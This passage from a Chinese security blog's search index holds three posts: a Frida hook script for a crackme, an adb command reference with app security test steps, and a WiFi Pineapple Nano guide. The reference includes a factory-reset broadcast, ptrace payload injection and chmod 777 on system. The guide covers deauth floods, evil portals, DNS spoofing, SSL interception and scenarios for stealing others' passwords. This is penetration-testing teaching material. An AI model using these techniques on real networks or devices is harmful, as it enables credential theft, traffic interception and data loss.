'send': print(&quot;[*] {0}&quot;.format(message['payload'])) else: print(message)js_code = ''' Java.perform(function(){ var robust = Java.use(&quot;com.meituan.robust.utils.EnhancedRobustUtils&quot;); robust.invokeReflectMethod.implementation = function(v1,v2,v3,v4,v5){ var result = this.invokeReflectMethod(v1,v2,v3,v4,v5); if(v1==&quot;Joseph&quot;){ console.log(&quot;functionName:&quot;+v1); console.log(&quot;functionArg3:&quot;+v3); console.log(&quot;functionArg4:&quot;+v4); send(v4); console.log(&quot;return:&quot;+result); console.log(&quot;-----------------------------------------------------&quot;) } else if(v1==&quot;equals&quot;){ console.log(&quot;functionName:&quot;+v1); console.log(&quot;functionArg3:&quot;+v3); console.log(&quot;functionArg4:&quot;+v4); send(v4); console.log(&quot;return:&quot;+result); } return result; }});'''session = frida.get_usb_device().attach(&quot;cn.chaitin.geektan.crackme&quot;)script = session.create_script(js_code)script.on('message',on_message)script.load()sys.stdin.read() 运行脚本 点击Onclick 参考链接 https://bbs.pediy.com/thread-229597.htm","link":"/2021/01/05/Android/frida/Frida-Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex-Hook-%E4%B8%8A/"},{"title":"adb使用总结","text":"adb使用 adb连接adb connect ip:5555 adb devices adb -s device-id shell //指定某个设备(插充电设备或USB网络时) // 查看网络状态 adb shell netstat // 通过 tcp/ip 连接，默认端口 5555 adb connect host:port // 转发套接字连接 adb forward local remoteadb 截图发送到当前用户目录下adb exec-out screencap -p &gt; 1.pngadb文件导出/导入从电脑上复制文件到设备// 把 a.png 从电脑上拷贝到设备sd卡上 adb push ~/a.png /mnt/sdcard/ // 把 a.png 从电脑上拷贝到设备sd卡上并重命名为 b.png adb push ~/a.png /mnt/sdcard/b.png​ // 把 pic目录下所有文件从电脑上拷贝到设备sd卡上 adb push ~/pic/ /mnt/sdcard/从设备复制文件到电脑// 把 a.png 从设备sd卡上拷贝到电脑上 adb pull /mnt/sdcard/a.png ~/ // 把 a.png 从设备sd卡上拷贝到电脑上并命名为b.png adb pull /mnt/sdcard/a.png ~/b.png // 把pics目录下所有文件从设备sd卡上拷贝到电脑上 adb pull /mnt/sdcard/pics/ ~/pics/​ 一些基本命令// 列出sd卡根目录下所有文件 adb shell ls /sdcard/ // 定位到 /sdcard/目录 adb shell cd /sdcard/ // 删除某文件 // -f 强制删除文件不需要确认 // -r 递归删除文件夹内文件 // -i 删除文件前需要确认 adb shell rm /sdcard/1.txt // 创建目录 adb shell mkdir /sdcard/temp/ // 指定 -p 递归创建目录 adb shell mkdir -p /sdcard/temp/test/abc/hello/ // 创建文件 adb shell touch /sdcard/1.txt // 显示当前所在目录 adb shell pwd // 拷贝文件1.txt到test目录 adb shell cp /sdcard/1.txt /sdcard/test/ // 移动文件，移动同一目录下文件相当于重命名文件 adb shell mv /sdcard/1.txt /sdcard/2.textadb修改手机代理全局代理设置代理： adb shell settings put global http_proxy 代理IP地址:端口号 如： adb shell settings put global http_proxy 192.168.137.97:8888 移除代理： adb shell settings delete global http_proxy adb shell settings delete global global_http_proxy_host adb shell settings delete global global_http_proxy_port证书安装 手机获取Root权限后，直接把Base64文本格式的根证书文件复制到etc/security/cacerts文件夹里，然后到设置(Settings) – 安全(Security) – 受信任的凭据(Trusted credentials)里面，此时你要安装的根证书应该会显示已经安装好了。这样安装之后根证书是作为系统证书使用的，而不是按照方法一安装方式的用户证书。 .cer（非.crt）格式文件 http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates 12345678a. openssl x509 -inform DER -subject_hash_old -in CA_Name.cer | head -1得到类似字符串：9a5ba575b.cat CA_Name.cer &gt; 9a5ba575.0c.openssl x509 -inform DER -text -in CA_Name.cer -out /dev/null &gt;&gt; 9a5ba575.0d.放入/system/ca-certificates/files/实际测试，可能会报错，报错后不管格式，DER 换成PEM 试试编译到：/system/etc/security/cacerts/e:烧录重启验证 http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates Fiddler默认是cer证书，如何转为pem呢？指令如下： 1openssl x509 -inform der -in abc.cer -out out.pem https://segmentfault.com/a/1190000017035564解决只读文件无法写入的问题： 123adb remountadb shellchmod 777 system 第三方apkAndroidProxySetter工具可以帮助我们使用adb命令可以快速进行wifi代理的设置和清除GitHub地址：https://github.com/jpkrause/AndroidProxySetter 下好apk后，安装到手机 adb install proxy-setter-debug-0.2.1.apk设置代理： 1adb shell am start -n tk.elevenk.proxysetter/.MainActivity -e host 代理IP地址 -e port 端口号 -e ssid WIFI名称 -e reset-wifi true -e key WIFI密码 如： 1adb shell am start -n tk.elevenk.proxysetter/.MainActivity -e host 127.0.0.1 -e port 8888 -e ssid YOUR-WIFI-NAME -e reset-wifi true -e key YOUR-WIFI-PASSWORD 查看进程// 列出进程列表 ，其中包含进程的 pid 等信息 adb shell ps // 杀死指定pid的进程 adb shell kill pid // 查看指定进程信息 adb shell ps -x pid apk管理adb导出（手机apk到电脑）1、adb shell pm list package 打印出来所有安装到手机上的APP包名 adb shell pm list package com.huawei. //查找包含com.huawei的包 2、adb shell pm path com.xxx.xxx 找出安装后的包名应用的apk所在位置 3、adb pull path_apk out_apk path_apk为apk在手机上的目录，即2中的apk在手机中的目录，out_apk为导出apk的目标路径。 4、通过adb命令查看Android手机已安装应用的版本号versionCode和versionName adb shell dumpsys package [PackageName] | findstr versionCode adb shell dumpsys package [PackageName] | findstr versionName日志输出// 查看指定 tag 日志 adb logcat -s tag // 清除log缓存 adb logcat -c启动activity// 启动应用 // -n 指定包名/包名+启动类的类名 ，启动类的类名必须是完整路径 adb shell am start -n package/package-activity // 停止应用 adb shell am force-stop package // 启动 service adb shell am startservice [options] &lt;INTENT&gt; 举例：adb shell am startservice -a com.lt.test.action.ONESERVICE 举例：adb shell am startservice -n com.lt.test/.MyService // 发送广播 adb shell am broadcast [options] &lt;INTENT&gt; // 发送一个广播去关闭一个activity adb shell am broadcast -a &quot;action_finish&quot; // 恢复出厂设置的方法，会清除内存所有内容 adb shell am broadcast -a android.intent.action.MASTER_CLEAR adb shell am broadcast -n com.lt.test/.MyBroadcast // 列举出所有包含&lt;INTENT&gt;的package adb shell pm list packages [options] &lt;INTENT&gt; adb shell pm list packages com.lt管理安装包adb shell pm 安装应用程序 adb install xxx.apk // 覆盖安装(保留缓存和数据) adb install -r xxx.apk // 安装apk到sd卡 adb install -s xxx.apk 卸载应用程序 adb uninstall package // 卸载时保留数据和缓存目录 adb uninstall -k package​ 列出设备上的所有权限 adb shell pm list permissions 列出设备上安装的所有app的包名 adb shell pm list packages // 列出指定包名对应的apk路径 adb shell pm path com.android.search // 清空指定包名对应的应用的数据和缓存文件，开发时很有用 adb shell pm clear com.android.search​ 列出设备上的所有feature adb shell pm list featuresadb安装证书adb shell am start -n com.android.certinstaller/.CertInstallerMain -a android.intent.action.VIEW -t application/x-x509-ca-cert file:///sdcard/cacert.cer 参考：https://www.jianshu.com/p/f547b05a5335 查看系统信息// 获取系统属性，可以获取到一大堆关于系统信息（键值对形式） adb shell getprop // 获取系统属性并过滤出包含version的信息 adb shell getprop | grep version​ 查看 cpu 和 内存使用情况 // 每隔一秒会刷新一次 cpu 和 内存情况 adb shell top // 查看占用内存前3的应用 adb shell top -m 3 // 刷新3次内存信息（不指定-n参数的话默认每秒会刷新1次数据）： adb shell top -n 3 // 查看占用内存前3的应用，刷新1次 adb shell top -m 3 -n 1​ 查看系统当前 cpu 使用情况 adb shell cat /proc/cpuinfo adb shell cat /proc/stat 查看系统当前内存使用情况 adb shell cat /proc/meminfo 查看指定包名应用内存使用情况，各项信息具体说明 adb shell dumpsys meminfo package​ 查看 service adb shell service list adb shell cat /system/build.prop 电池相关 // 查看电量管理信息，其中可以知道当前那个应用持有WAKE_LOCK锁 adb shell dumpsys power // 查看电池用量情况 adb shell dumpsys battery // 查看电池使用日志 adb shell dumpsys batterystats 图形界面日志分析参考google提供的工具 https://github.com/google/battery-historian查看当前activitylogcat | grep ActivityManager adb shell dumpsys activity activities adb shell dumpsys activity activities | findstr &quot;应用包名&quot; 过滤字符串忽略大小写 : adb logcat | grep -i wifi ; 过滤固定字符串 : 只要命令行出现的日志都可以过滤, 不管是不是标签; -- 命令 : adb logcat | grep Wifi ;APP安全测试组件安全activity 是否可以被ddos1adb shell am start -S -n 包名/Activity名 BroadcastReceiver拒绝服务查看AndroidManifest.xml是否存在Receiver导出利用adb命令启动被导出的Receiver 1adb shell am broadcast –n pachage_name/receiver_name service拒绝服务查看AndroidManifest.xml是否存在Service导出利用adb命令启动被导出的Service 1adb shell am start service –n pachage_name/service_name Provider目录遍历查看Provider是否导出查看反编译代码,检查OpenFile函数中是否包含路径校验逻辑 Ptrace注入检测方法一：1234推送inject和libpayload.so到手机/data/local/tmp中为inject添加执行权限执行注入命令inject 进程名 /data/local/tmp/libpayload.so 任意字符串adb logcat -s 360Inject抓取日志分析是否注入成功 检测方法二：12frida-trace -U -i &quot;recv*&quot; -f 包名cat /proc/PID/maps |grep frida SharedPreferences明文保存敏感信息跳转到app的数据目录 查看所有xml文件,检测是否包含敏感数据 12adb shellcd /data/data/package_name/hared_prefs/ 查看所有xml文件,检测是否包含敏感数据 SQLite明文保存敏感信息跳转到app的database目录 查看所有db文件,检测是否包含敏感数据 12adb shellcd /data/data/package_name/database/ 查看所有db文件,检测是否包含敏感数据 log敏感信息检测使用logcat命令抓取log 分析日志中是否包含敏感信息 1shell adb logcat &gt; logfile.log 分析日志中是否包含敏感信息","link":"/2021/01/05/Android/adb%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"},{"title":"WIFI渗透利器PineApple-Nano","text":"简介 The WiFi Pineapple 是由国外无线安全审计公司Hak5开发并售卖的一款无线安全测试神器（俗称大菠萝），从2008年起目前已经发布到第六代产品。当前的主打产品是The WiFi Pineapple NANO 和WiFI Pineapple TETRA（支持5GHz频段） 产品规格1234567891011121314151617CPU：400 MHz MIPS Atheros AR9331 SoC内存：64 MB DDR2 RAM磁盘：16 MB ROM + Micro SD（6G）无线：Atheros AR9331（wlan0）+ Atheros AR9271（wlan1），均为IEEE 802.11 b / g / n端口：（2）RP-SMA天线，USB网卡（ASIX AX88772A）USB 2.0主机，Micro SD读卡器电源：USB 5V 1.5A. 包括 Y型USB电源线可配置状态指示灯LED可配置的重置按钮 使用背景1.安全研究对于研究方向为wifi安全的小伙伴们，可以使用这款“外设”作为入门和进阶的部分，能够让我们了解一些常见的wifi安全问题、原理和攻击手段，进一步的可以分析这些利用工具的原理，实现方法，组合攻击手段 2.安全演示如果你是安服的小伙伴，给客户演示的时候不要总是带着自建靶场，给领导搞个SQL注入，永恒之蓝，过时了！就算你配合Cobalt Strike来个主机上线，也顶多是视觉上的刺激。你带个wifipineapple，现场来个中间人，搞个绵羊墙，抓个密码，岂不美哉？ 管理Web管理端地址：http://172.16.42.1:1471 特性 用作 Wi-Fi 中间人攻击测试平台 一整套的针对 AP 的渗透测试套件 基于 WEB 应用的管理界面 基于嵌入式 linux 系统 不定时的各种软件更新，可以自定义模块、payload 管理页面简介1.Dashboard仪表盘仪表盘上显示了一些状态、统计信息、通知和公告的概览视图，包括： CPU 使用率、设备运行时间、客户端连接数量 Landing Page 浏览状态，公告 Bulletins从wifipineapple.com获取的最新项目信息 2.Recon侦察Recon模块采用被动式扫描方式，扫描过程会自动将网卡设置为监听模式，监听周围不同信道（客户端）发出的各种数据包。能够扫描出SSID、MAC地址、加密方式、是否启用了WPS功能、信道及信号强度等信息。甚至还能扫描出当前未连接任何AP的客户端 从下拉列表为扫描的持续时间，增加扫描时间可以在每个信道上看到更多潜在的流量，选中“Continuous”框将启用正在进行的扫描。每隔一段时间进行持续扫描，并更新扫描结果列表，直到扫描停止 扫描结果将显示在表格视图中 未关联的客户端仅显示 MAC 地址。这些客户端具有活动无线电，但不与接入点关联 单击SSID和MAC地址旁的下拉菜单，会出现如下两张图的菜单，用于 PineAP 模块的 Filter(过滤) 和 Tracking(追踪) 功能，以及进行 Deauth(取消认证洪水) 攻击中发送取消身份验证帧的倍数参数 如果使用 Recon 模块进行扫描将会断开已有的连接 3.Client客户端如果在 PineAP 中勾选了 Allow Associations(允许关联)，WiFi Pineapple将允许客户端进行连接 已连接的客户端将在“ Clients ”视图中列出它们各自的MAC地址，IP地址，它们已连接的 SSID （如果在PineAP中启用了Log Probes(日志探测) 功能）和主机名 Kick按钮可以从Wi-Fi Pineapple网络中删除客户端 MAC地址和SSID旁边的下拉菜单按钮用于 PineAP 模块的 Filter 和 Tracking 功能 Refresh按钮可以刷新Clients表格视图 4.Tracking跟踪功能将按MAC地址连续扫描指定的客户端，并执行可自定义的跟踪脚本 此功能需要启用 PineAP 的 Log Probes 和 Log Associations 中的至少一个选项 可以手动添加客户端，也可以在 Clients 或 Recon 视图中关联的MAC地址使用 PineAP Tracking Add MAC 按钮添加 Mac 地址到此模块中 当客户端被识别时，将会执行自定义脚本 5.Filters 可以通过客户端MAC地址或SSID来执行过滤。支持“Deny”和“Allow”模式，可以使用Swith按钮进行切换 Client Filtering 客户端过滤在Deny Mode下，客户端过滤器中列出的具有MAC地址的客户端将无法连接到WiFi Pineapple 在 Allow Mode下，只有客户端过滤器中列出的具有MAC地址的客户端才能连接 进行WI-FI安全测试时，最好使用“Allow Mode”以确保仅针对参与范围内的客户端 SSID Filtering SSID过滤在Deny Mode下，如果客户端尝试连接到过滤器中列出的SSID，则客户端将无法与WiFi Pineapple关联 在 Allow Mode下，如果过滤器中列出了他们尝试连接的SSID，则客户端只能与WiFi Pineapple关联 SSID可以从与Recon中各自列表相关联的菜单按钮添加到过滤器中，也可以手动添加或删除过滤器中的条目 6.PineAP Pine接入点PineAP是通过伪造的Probe Response响应包来响应周围的客户端（可能是笔记本、手机、pad等等），让客户端以为周围存在着曾经成功连接过的无线AP，而用来欺骗客户端进行连接我们的Pineapple Nano设备 Allow Associations 允许关联此项被勾选时，客户端可以通过任何请求的 SSID连接到Pineapple 禁用时，客户端将不允许被连接。相当于以前的 karma PineAP Daemon PineAP 守护进程这个进程必须开启 可以使用 Beacon 响应，捕获 SSIDs 到池里，以及对SSID进行广播 这个设置会作用于 wlan1 ，并且 wlan1 不能用于 Client 模式去桥接外网 Log PineAP Events 日志探测开启后，将记录客户端的探针请求。可以从 Logging 模块里看查看分析 Beacon Response 响应开启之后，目标 beacons 将会发送给客户端设备，用来响应客户端的 SSID 探针请求 这些 beacons 将不会被广播，而是指定发送给发送了探针请求的客户端设备。这可以防止beacon 被其他设备看见。如果 Allow Associations 启用并且有客户端连接，目标 beacon 响应将持续发送给客户端设备一段时间 Beacon 响应将会使用源 mac 地址设置，并且也会与广播 SSID池特性共享 Beacon 响应间隔将决定发射的频率 Capture SSIDs to Pool使能之后，将会把捕捉到的探针请求里的 SSID 保存到 SSID 池子里。这 种被动的特点将有利于广播 SSID 池特性。SSID 池也可以被手动来管理 Broadcast SSID Pool使能之后，SSID 池将会按照设定的时间间隔以及源地址、目标地址来广播 beacon。就是以前的 Dogma Beacon Response Interval指定广播 SSID 的时间间隔。间隔越小，对 CPU 的占用就越高。 Beacon Response Interval指定 beacon 响应的时间间隔。间隔越小，对 CPU 的占用就越高 Source MAC默认情况下，是菠萝 wlan0 的 mac 地址。这是菠萝的 ap 的热点。wlan0 的 mac 地 址也可以在 Networking 里改变。如果需要的话，这个 mac 地址可以被设定为一个次要的菠萝。 Target MAC默认情况下，这是广播 mac 地址 FF:FF:FF:FF:FF:FF。用于广播帧数据将会被附近的 客户端看到。设置为客户端的 mac 地址将把 PineAP 的特性用于单一的设备。类似 beacon 响应，只 有池子里的 SSID 广播会被目标客户端看到。当和过滤器一起工作时，这个特性将更精确的定位到目 标设备。 SSID Pool当Capture SSID Pool 被使能后，会自动记录。也可以手动添加。点击列表里的 SSID， 也可以执行删除和清除操作 7.Tracking 跟踪功能将按MAC地址连续扫描指定的客户端，并执行可自定义的跟踪脚本 此功能需要启用 PineAP 的 Log Probes 和 Log Associations 中的至少一个选项 可以手动添加客户端，也可以在 Clients 或 Recon 视图中关联的MAC地址使用 PineAP Tracking Add MAC 按钮添加 Mac 地址到此模块中 当客户端被识别时，将会执行自定义脚本 8.Logging Logging模块共记录了 PineAP Log、System Log、Dmesg、Reporting Log四种日志 PineAP Log如果启用了Log Probes 和 Log Associations其中的一个或全部，则按时间顺序显示PineAP事件。每个事件都包含时间戳，事件类型（探测请求或关联），客户端设备的MAC地址以及设备探测或关联的SSID 可以对结果进行过滤，在按下”Apply Filter”之前，过滤器不会生效，默认情况下，PineAP日志位于/tmp中，重启不会保存 System Log系统日志 Dmesg设备故障的诊断，硬件连接断开等信息 Reporting Log生成报告日志 9.Reporting 此功能能够以指定的间隔生成报告。报告可以通过电子邮件发送，也可以本地保存在SD卡上 报告内容可选，包括PineAP日志（可以在生成报告后删除），PineAP Site Survey（可指定扫描时间）PineAP 探测和跟踪客户端报告。 10.Networking网络在 Networking 模块中，可以更改路由，接入点，MAC地址，主机名，并使用WiFi客户端模式连接到接入点 Route 路由显示内核IP路由表，可以针对所选接口进行修改，默认网关为172.16.42.42 使用WiFi Pineapple Connector Android应用程序时，IP路由将自动更新以使用usb0作为默认网关 下拉菜单可以重启DNS服务 Access Points 接入点可以配置WiFi Pineapple主要开放接入点和管理接入点。开放和管理接入点共享相同的信道 可以隐藏开放接入点，并且可以禁用管理接入点 WiFi Client Mode WI-FI客户端模式能够将WiFi Pineapple连接到另一个无线接入点，以进行Internet或本地网络访问 11.ConfigurationLanding Page启动后，客户端全部链接将会被强制导向到此页面，页面访问的统计信息将会显示在 Dashboard 上 页面可以是 PHP 或 HTML 的 只有WiFi Pineapple具有Internet连接时，才会显示此页面 12.Advanced此页面显示一些系统资源信息，USB 设备，文件系统列表，CSS 和固件升级。 13.Help可以查看对应模块的帮助和使用介绍 常用模块模块总结12345678910111213141516171819202122232425262728293031323334353637DWall 绵羊墙，可以显示 HTTP URLs, Cookies, POST DATA，可实时展示客户端的图片Deauth 对菠萝附近接入到其他 AP 的客户端进行认证攻击EvilPortal 一个邪恶的强制网络门户SSLsplit 使用 SSLsplit 执行中间人攻击Status 显示设备的状态信息ettercap 使用 ettercap 执行中间人攻击NMAP GUI 的安全扫描器 NMAPSiteSurvey 无线现场调查urlsnarf 使用 urlsnarf 输出 客户端所有的 http URL 请求Occupineapple 广播用于欺骗的 WiFi SSID 热点tcpdump 使用 tcpdump 抓取 客户端数据包DNSspoof dns 欺骗SignalStrength 显示附近 ap 的信号强度RandomRoll 恶搞连接到菠萝的客户端wps 使用 Reaver, Bully and Pixiewps 进行 wps 攻击ConnectedClients 显示当前连接的客户端设备的信息OnlineHashCrack 提交 Hash 和 WPA Handshake 包 到 www.onlinehashcrack.comPortalAuth 强制门户克隆 和 流量分发get 通过客户端的浏览器插件来识别客户端的信息p0f 使用 p0f 被动流量指纹Papers 一个 TLS/ SSL 和 SSH 证书生成管理插件LogManager 管理所有模块的 log 信息Cabinet web 页面的文件管理器Responder LLMNR，NBT-NS 和 MDNS 投毒内置的 HTTP，SMB，MSSQL，FTP 和 LDAP流氓认证服务器DNSMasqSpoof 使用 dnsmasq 来进行 dns 欺骗ngrep 使用 ngrep 来匹配查找数据包autossh autossh 插件，可用于远程 ssh 来管理菠萝dump1090 使用 RTS-SDR 获取轨道飞行器的 ADS-B 信标KeyManager ssh 密匙管理器CursedScreech 安全控制容易被入侵的系统base64encdec Base64 编码和解码ModuleMaker module 生成工具APITokens 在 wifipineapple 上创建和删除 API 令牌Commander 通过 IRC 控制菠萝HackRF HackRF 插件 DWall绵羊墙DWall 是一款可以实时抓取 http 数据的插件，并且可以实时展示在web页面上 Enable开启模块，Start Listening 开始监听 所有连到 Pineapple 客户端的http连接都会被抓到 页面显示了客户端、URL、Cookies、数据内容，以及图片 DeauthDe-authenticationFlood Attack，全称为取消身份验证洪水攻击或验证阻断洪水攻击，通常被简称为Deauth攻击，是无线网络拒绝服务攻击的一种形式。它旨在通过欺骗从AP到客户端单播地址的取消身份验证帧来将客户端转为未关联／未认证的状态 normal模式下，选中网卡，点击 Start 后就开始攻击攻击过程中同网段内的网络认证（由于NANO不支持5G，所以攻击仅支持2.4G）均会失败，无法认证并连接 要针对某个WI-FI攻击，可以在Editor中选中网卡，扫描WI-FI，并Add to Blacklist（添加到黑名单），在Mode中也选择blacklist，输入Channels，信道可以去SiteSurvey中查看 DNS/DNSMasq Spoof这个插件会启动 DNSMasq 服务，对客户端访问的域名进行重定向 在Hosts处填写要重定向的域名，写法与其他 Hosts 文件一致 此处可以填写内网配置好的钓鱼服务器，也可以指到Pineapple，并在上面搭建服务 Urlsnarf URL捕获选定网口后点击 Start ，模块将会捕获全部的HTTP流量，GET及POST的数据均会显示 显示格式为web访问日志类型 Evil Portal模块主要由以下几个部分组成： Controls（控制）：启用模块和设置自动启动； Word Bench（创建工作目录）：包含门户页面的php文件等； White List（白名单）：不需要通过门户认证页面跳转的IP地址列表； Authorized Clients（认证客户端）：当前通过门户页面认证跳转过的IP地址列表； Live Preview（预览）：预览恶意门户页面。 Evil Portal模块和自带的Landing Page功能很像，区别在于Landing Page仅能够提供一个强制跳转显示页面的效果，不具有认证、白名单以及更自由化的门户页面自定义功能。Evil Portal能够实现像现在的商业WiFi接入访问一样，提供一个由我们自定义的认证页面，引导客户端用户完成认证及跳转功能 Tcpdumptcpdump可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来去掉无用的信息，是一款非常高级的网络数据分析工具 与Pineapple上很多其他的模块一样，提供的可供点选的web管理界面 Options提供了基本的选项模块 在下方选中或勾选的参数将会被格式化到 Command 处 Interface 为需要监听的端口 Verbose 对应 -v 选项，代表输出报文信息的详细程度 Resolve 对应 -n 选项，不将主机名转换为IP地址，以及不进行端口名称的转换 Timestamp 对应 -t 选项，指定是否输出时间戳或时间戳格式 Don’t print domain name qualification of host names:对应 -N 选项，不输出主机名中的域名部分。例如，’wiki.ver007.org’只输出’wiki’ Show the packet’s contents in both hex and ASCII:对应 -X 选项，在解析和打印时，除了打印每个包的报头之外，还要用十六进制和ASCII打印每个包的数据（通常用于分析一种协议） Print absolute sequence numbers：对应 -S 选项，将tcp的序列号以绝对值形式输出 Get the ethernet header as well：对应 -e 选项，在输出行打印出数据链路层的头部信息 Show less protocol information：对应 -q 选项，快速输出。只输出较少的协议信息 Monitor mode：对应 -I 选项，使标准输出变为缓冲行形式，可以把数据导出到文件 Filter提供了一些过滤规则，我们可以利用Filter编写过滤表达式，用来匹配得到我们想要的结果，在点选参数之后，手动输入参数值，并继续点击下一个参数，同样的，如果你熟悉tcpdump的话，可以进行手工填写，跟wireshark什么的过滤语法道理都类似 Output为系统回显，History则可以查看和管理抓住的完整tcp数据包 在此处可以将捕获的包下载，得到一个pcap文件，可以在wireshark、networkminer、科来等其他工具中 具体的使用方法就根据需求不同定制，需要熟悉过滤表达式的编写 需要注意的是，tcpdump只能抓取流经本机的数据包，因此确保有 Client 连接上网 由于页面仅提供部分命令，如果想要达到与命令行完全一样的效果，可以SSH连接到Pineapple直接运行tcpdump.sh，路径在/pineapple/modules/tcpdump/scripts Meterpreter大名鼎鼎的 Meterpreter，配置主机端口后能够接收会话 Ettercap调用 ettercap 这款工具进行中间人欺骗，将参数转换为web页面，并将输出返回到页面上 SSLsplitSLsplit可以作为中间人监听 SSL 信息及 HTTP 信息。SSL 实现代理的同时要与服务器建立连接，同时伪造证书与客户端建立连接，即双连接，依据获取的 Client 信息再与服务器通信，从而实现明文数据监听 Configuration无需改变，使用默认即可 在客户端使用HTTPS进行通讯时，将会由SSLsplit作为中间代理 SLLsplit的实现需要配合其他欺骗手段，如果有Clients连接到Pineapple，那么就直接可以进行攻击，如果要攻击的目标在同一网段内，则需要将目标流量定向到此模块的监听端口，通常配合 ettercap等欺骗软件 如果网站具有HSTS（HTTP Strict Transport Security）,网站将不能正常显示，也就无法攻击 nampOptions（选项）与图形化的Nmap页面相似，输入目标，在 Profile 中选择一些预置的规则 ![image-20210120192348639](../../../../../../Library/Application Support/typora-user-images/image-20210120192348639.png) RandomRoll这个模块是一个略微搞怪的模块，开启模块后，将会把全部 http 连接进行重定向到内置的黑页中 就是下面勾选的这些 rolls，每个对应一个黑页，随机选择出现 开启后，客户端会随机出现选中的黑页 base64encodebase64加解密模块 CursedScreech这是一个远控模块 Sein：信息收集功能，当监听的网络内出现漏洞系统时，将会更新模块的 target 列表 Kuro：攻击功能，自动尝试连接Sein功能发现的目标机器，并连接 Listening Interface（监听端口）：用于组播socket的接口，如果目标直接连接到Pineapple，使用br-lan就可以 Multicast Group（组播组）：发送和接收目标心跳的地址，对于Sein和目标机器，组需要相同 Multicast Port（组播端口）：Sein将从目标接收消息的端口。这个端口需要在payload的startMulticaster()方法中 Heartbeat Interval（心跳间隔）：payload发送广播的间隔，Sein在3个心跳间隔还为收到广播包的话，就会判断目标为掉线状态 Kuro Keys/Target Keys（密钥）：用于TLS通信时的密钥，可以使用Papers模块创建Keys 可以从下方两个下载按钮下载 C# 和 Python 的payload模板 Activity Log（活动日志）：记录 Kuro 功能执行过程中产生的全部记录，使用模块的大部分时间都是盯着这里看 右边的Targets就是一个上线机器列表，以及一个命令执行功能 如果有目标机器的话，可以通过Select选择机器，并执行命令 EZ Cmds事先预置了一些cmd命令，可以添加及删除 设置好了之后，按照下载的模板，编写payload，在目标机器上运行 运行后点击Sein进行监听，测试时发现python版本的payload在监听后需要多等一下才能上线，此处要耐心等待一下，上线后可以开启Kuro，再耐心多等一会 当日志显示Kuro is ready后，就可以执行命令了 dump1090本模块能够对 1090MHz 的无线电进行收取和解码，通过调用google-API等方式，可以在web地图上描绘出飞机的轨迹，当然也可以手动更改频率如： 我国民航使用的无线电频率：1090MHz 民用对讲机使用的无线电频率：408-409MHz 警用频率：350-390MHz 等等 软件有很多参数，但是界面上只显示了Gain Checkbox 参数可以切换度量衡使用公制单位、切换到自动获取、增大功率、将结果输出为csv格式 使用此模块需要RTL-SDR（电视棒）接收无线电信号，插入模块，将显示地图 HackRF这个模块需要配合HackRF 硬件进行使用，在接入HackRF后，会出现一个简单的设置界面 模块选项相当于 hackrf_transfer 的相关参数 12345678910111213Sample Rate（采样率）：每秒发送或接受的样本量。受到系统计算能力限制，设置过高可能会导致系统不稳定，此处建议设置默认10M或更低，相当于 -sCenter Frequency（中心频率）：就是HackRF开始调谐的频率，相当于 -fTransceiever Mode（收发方式）：HackRF是半双工工作模式，因此必须指定是要 TX（发送）还是RX（接收），相当于 -t 或 -rFile Name（文件名）：目标文件路径，可以将收到的信号记录，也可以从文件发送RF Amp &amp; Antenna Power（射频放大器和天线功率）：Enable RF AMP可以指定是否开启射频放大器，Antenna Power可以指定功率是否被传送到天线端口RX IF Gain &amp; RX BB Gain（RX二中频增益和RX BB增益）：根据不同层级的db及步长选择增益模式Repeat Transmission &amp; TX IF Gain（重复和TX二中频增益）：是否重复播放，以及设置发送增益 先进行录制，并保存到文件中 然后进行重放，即可攻击成功，如果重放失败，可以调整放大器的增益 在实际测试过程中，将会如上图报错，调试了一会依旧无法实现功能 这个模块仅仅是简单的收取/重放，如果想要解码、编码再重放，单靠这个是实现不了的，而且在不清楚无线电工作频率的情况下还是没有办法使用，因此还是将其定义为演示模块 Module Maker模块制作，能够生成及管理模块 并给出了模块需要的模式 是一个为开发者编写新模块的web界面 ngrepngrep就相当于网络版的grep，支持大量的操作系统和网络协议。能识别TCP、UDP和ICMP包，理解bpf的过滤机制。与 tcpdump 类似 OccupineappleOccupineapple 是一个干扰模块，能够在周围生成各种随机或者自定义的SSID Speed：每秒发送的数据包 Channel：在哪个信道上生成虚假AP Show station as Ad-Hoc：将站点显示为点对点 Set WEP bit (Generates encrypted networks)：设置WEP位（生成加密网络） Show station using WPA TKIP encryption：显示使用WPA-TKIP加密的站点 Show station using WPA AES encryption：显示使用WPA-AES加密的站点 Use valid accesspoint MAC from OUI database：使用来自OUI数据库的有效Access Editor 参数处可以选择、编辑或创建List，List中存放SSID名称及Mac地址 攻击场景1.搞怪如果想要简单的搞怪一下周围的人，不进行恶意的破坏和复杂的攻击行为，可以使用Occupineapple或者RandomRoll模块 使用Occupineapple在四周生成一些有趣的SSID，比如“XXX是个小智障”，“XXX是个小笨蛋”等等，十分有趣 也可以使用RandomRoll，在有客户端连入Pineapple网络时，可以将HTTP网页重定向到默认搞怪的网页上，给人一个惊喜 2.技术演示如果想要给身边的人演示一些简单的WI-FI攻击，无需特别多的技术准备，可以使用Dwall、DNS/DNSMasq Spoof、urlsnarf Dwall即是著名的“绵羊墙”，可以显示抓到的URL、cookie、图片用，用来做演示十分方便 DNS/DNSMasq Spoof 可以重定向用户DNS，配合Landing Page或其他web应用可以进行钓鱼、嗅探等 urlsnarf显示网络内http数据包，抓取到的url，显示也很直观 配合HackRF硬件可以简单重放无线电攻击，进行一些演示 3.窃取密码如果想要窃取在同一网络下其他客户端产生的密码，也许是某些网站账户密码，也许是其他WI-FI密码，有几种方式可以达到目的 想要获得附近的WI-FI密码，可以使用Site Survery抓取WPA握手包，再使用Online Hash Crack进行尝试破解 使用wps模块直接进行WI-FI密码破解 想要获得客户端在其他某些网站上的密码，可以使用Landing Page、Evil Portal、Portal Auth制作钓鱼页面，结合ettercap做欺骗，或者让客户端连接到Pineapple网络中，在钓鱼页面输入密码，进行记录 也可以使用ettercap进行网络欺骗，将自己欺骗成为网关，获取流量，就可以截获明文传输的密码，配合SSLsplit即可抓取https传输的密码 使用Responder进行欺骗，窃取某些协议中的密码/hash值 4.漏洞利用Pineapple还提供了一些漏洞利用模块，可以针对网络内漏洞进行攻击 